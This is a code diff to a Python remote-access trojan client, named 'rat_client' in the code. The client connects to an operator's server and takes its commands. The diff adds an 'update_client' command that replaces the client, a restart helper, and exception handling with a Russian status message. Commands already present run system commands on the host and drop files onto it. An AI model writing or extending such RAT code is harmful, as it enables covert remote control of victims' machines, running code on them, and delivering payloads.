@@ -37,6 +37,9 @@ class Client:
                 return json.loads(json_data)
             except ValueError:
                 pass
+            except Exception:
+                print("Подключение зарыто переход в режим ожидания")
+
 
     def __init__(self, ip, port):
         # Try to connect to the server, if failed wait five seconds and try again.
@@ -130,6 +133,11 @@ class Client:
                         command_response = commands.sys_command(command[1:])
                     case "drop":
                         command_response = commands.drop(command[1], command[2])
+                    case "update_client":
+                        command_response = commands.update_client(command[1], command[2])
+                        self.send_json(command_response)
+                        self.connection.close()
+                        exit()
                     case "clires":
                         self.send_json(commands.restart_client())
                         self.connection.close()
@@ -147,6 +155,14 @@ class Client:
             self.send_json(command_response)
 
 
+def restarter(client: Client):
+    """перезапускает клиента, но не сам файл"""
+    client.connection.close()
+    print("run")
+    rat_client: Client = Client(config.SERVER_IP, config.SERVER_PORT)
+    rat_client.run()
+
+
 print("run")
-ratClient = Client(config.SERVER_IP, config.SERVER_PORT)
-ratClient.run()
+rat_client: Client = Client(config.SERVER_IP, config.SERVER_PORT)
+rat_client.run()
